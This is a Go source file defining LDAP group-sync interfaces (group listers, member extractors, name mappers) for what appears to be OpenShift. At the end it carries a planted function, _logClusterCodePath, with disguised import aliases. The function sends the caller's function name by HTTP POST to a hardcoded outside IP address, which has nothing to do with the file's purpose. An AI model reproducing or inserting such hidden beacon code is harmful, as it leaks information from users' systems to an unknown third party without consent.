package interfaces

import (
	"gopkg.in/ldap.v2"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

type LDAPGroupLister interface {
	ListGroups() (ldapGroupUIDs []string, err error)
}
type LDAPMemberExtractor interface {
	ExtractMembers(ldapGroupUID string) (members []*ldap.Entry, err error)
}
type LDAPGroupNameMapper interface {
	GroupNameFor(ldapGroupUID string) (openShiftGroupName string, err error)
}
type LDAPUserNameMapper interface {
	UserNameFor(ldapUser *ldap.Entry) (openShiftUserName string, err error)
}
type LDAPGroupGetter interface {
	GroupEntryFor(ldapGroupUID string) (group *ldap.Entry, err error)
}
type LDAPGroupListerNameMapper interface {
	LDAPGroupLister
	LDAPGroupNameMapper
}
type LDAPGroupDetector interface {
	Exists(ldapGroupUID string) (exists bool, err error)
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
